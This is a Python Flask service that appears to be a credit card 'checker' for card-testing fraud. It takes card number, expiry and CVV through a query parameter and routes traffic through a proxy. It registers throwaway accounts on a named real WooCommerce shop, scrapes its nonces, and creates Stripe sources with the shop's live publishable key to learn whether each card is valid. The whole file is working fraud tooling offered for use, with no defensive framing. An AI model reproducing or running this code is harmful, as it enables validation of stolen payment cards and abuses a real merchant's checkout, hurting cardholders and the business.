import re, uuid, random, string, asyncio
import httpx
from flask import Flask, request, jsonify

app = Flask(__name__)

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def find_between(text, start, end):
    pattern = re.escape(start) + r"(.*?)" + re.escape(end)
    match = re.search(pattern, text)
    return match.group(1) if match else None

@app.route('/stripeauth')
async def stripe_auth():
    cc_param = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not cc_param:
        return jsonify({'error': 'Missing cc parameter'}), 400

    try:
        cc, mes, ano, cvv = cc_param.split('|')
    except:
        return jsonify({'error': 'Invalid cc format. Use cc|mm|yy|cvv'}), 400

    email = generate_random_email()
    proxy_url = f"http://{proxy}" if proxy else None
    proxies = {"http://": proxy_url, "https://": proxy_url} if proxy else None

    async with httpx.AsyncClient(proxies=proxies, timeout=15) as client:
        # Step 1: Get register nonce
        r1 = await client.get('https://thefloordepot.com.au/my-account/')
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r1.text).group(1)

        # Step 2: Register
        reg_data = {
            'email': email,
            'password': 't4aa6ffDaVDMRix',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        await client.post('https://thefloordepot.com.au/my-account/', data=reg_data)

        # Step 3: Get nonce for payment
        r3 = await client.get('https://thefloordepot.com.au/my-account/add-payment-method/')
        adt = find_between(r3.text, '"add_card_nonce":"', '","')

        # Step 4: Create Stripe source
        stripe_payload = {
            'referrer': 'https://thefloordepot.com.au',
            'type': 'card',
            'owner[name]': ' ',
            'owner[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': str(uuid.uuid4()).replace('-', ''),
            'muid': str(uuid.uuid4()).replace('-', ''),
            'sid': str(uuid.uuid4()).replace('-', ''),
            'payment_user_agent': 'stripe.js',
            'time_on_page': '249562',
            'key': 'pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
        }

        stripe_headers = {
            'content-type': 'application/x-www-form-urlencoded'
        }

        stripe_resp = await client.post(
            'https://api.stripe.com/v1/sources',
            data=stripe_payload,
            headers=stripe_headers
        )

        stripe_json = stripe_resp.json()
        source_id = stripe_json.get("id")
        if not source_id:
            return jsonify({"error": "Stripe source creation failed", "stripe_response": stripe_json}), 400

        # Step 5: Final check
        final_data = {
            'stripe_source_id': source_id,
            'nonce': adt
        }

        r5 = await client.post(
            'https://thefloordepot.com.au/?wc-ajax=wc_stripe_create_setup_intent',
            data=final_data,
            headers={"x-requested-with": "XMLHttpRequest"}
        )

        final_json = r5.json()
        message = final_json.get("error", {}).get("message")
        status = final_json.get("status", "unknown")

        return jsonify({
            "message": message if message else "Card processed successfully",
            "status": status,
            "brand": stripe_json.get("card", {}).get("brand", "N/A"),
            "country": stripe_json.get("card", {}).get("country", "N/A"),
            "funding": stripe_json.get("card", {}).get("funding", "N/A")
        })

if __name__ == "__main__":
    import os
    import uvicorn
    port = int(os.environ.get("PORT", 5000))
    uvicorn.run("stripeauth:app", host="0.0.0.0", port=port, reload=True)
        
